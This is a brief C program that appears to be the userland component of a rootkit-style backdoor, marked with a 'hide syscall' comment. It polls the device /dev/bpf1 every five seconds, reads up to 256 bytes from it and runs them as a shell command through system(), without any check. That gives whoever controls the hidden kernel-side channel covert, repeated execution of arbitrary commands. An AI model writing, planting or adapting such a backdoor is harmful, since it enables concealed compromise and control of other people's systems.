#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <paths.h>
#include <string.h>
#include <sys/types.h>
#include <sys/ioccom.h>

// hide syscall
#include <sys/syscall.h>

void exec()
{	
	int kernel_fd;
	char cmd[256+1];

    if ((kernel_fd = open("/dev/bpf1", O_RDWR)) == -1) 
	{
		printf("can't open /dev/bpf1 !\n");
		exit(-1);
    }

	if (read(kernel_fd, cmd, 256) == -1) 
	{
		printf("can't read()\n");
		exit(-1);
	}

	system(cmd);

}

int main(int argc,char *argv[])
{
	while(1)
	{
		sleep(5);
		exec();
	}
}